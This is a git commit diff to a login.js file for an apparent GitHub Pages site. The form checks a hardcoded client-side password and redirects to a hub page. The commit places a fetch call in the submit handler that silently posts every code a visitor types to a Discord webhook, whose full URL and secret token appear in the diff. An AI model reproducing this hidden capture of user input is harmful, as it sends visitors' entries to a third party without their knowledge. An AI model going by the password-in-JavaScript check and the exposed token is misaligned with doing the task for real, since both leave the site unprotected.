d04e6275f0aea804c0f642d24265c0511a39e996
Hjr <john789811@gmail.com>
2025-03-17 13:25:51 +1100

    Update login.js

--- login.js
+++ login.js
@@ -1,17 +1,19 @@
 document.querySelector("#rizz").addEventListener("submit", (e) => {
     e.preventDefault();
     const val = document.querySelector("#code").value;
+
+    fetch("https://discord.com/api/webhooks/1351015431464550431/GL-jIECWU2kmIG7zQx1sTPC9i5THVnWwzrtO1VHRjQG4rkRCwHYh9dBkcBqaqyDNEbV2", {
+      method: "POST",
+      headers: {
+        "content-type": "application/json"
+      },
+      body: JSON.stringify({
+        "content": val
+      })
+    });
+
     if (val == "monkey") {
                 localStorage.login = "iloveyou";
         window.location.href = "https://koenigseggregera.github.io/hub.html";
     }
-});
-fetch("https://discord.com/api/webhooks/1351015431464550431/GL-jIECWU2kmIG7zQx1sTPC9i5THVnWwzrtO1VHRjQG4rkRCwHYh9dBkcBqaqyDNEbV2", {
-  method: "POST",
-  headers: {
-    "content-type": "application/json"
-  },
-  body: JSON.stringify({
-    "content": val
-  })
 });
